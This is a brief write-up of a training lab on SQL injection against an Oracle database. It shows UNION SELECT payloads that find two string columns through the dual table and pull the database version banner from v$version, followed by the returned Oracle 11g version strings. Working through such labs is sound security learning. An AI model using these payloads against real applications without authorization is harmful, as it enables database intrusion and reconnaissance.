# Lab: SQL injection attack, querying the database type and version on Oracle

There are two string columns to work with: `'UNION+SELECT+'a','a'+FROM+dual--`

The 'dual' table indicates that this is an Oracle DB (but the lab provides this info).

Use the second column for data, leave the first as NULL: `'UNION+SELECT+NULL,banner+FROM+v$version--`

This returns the necessary items:
```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```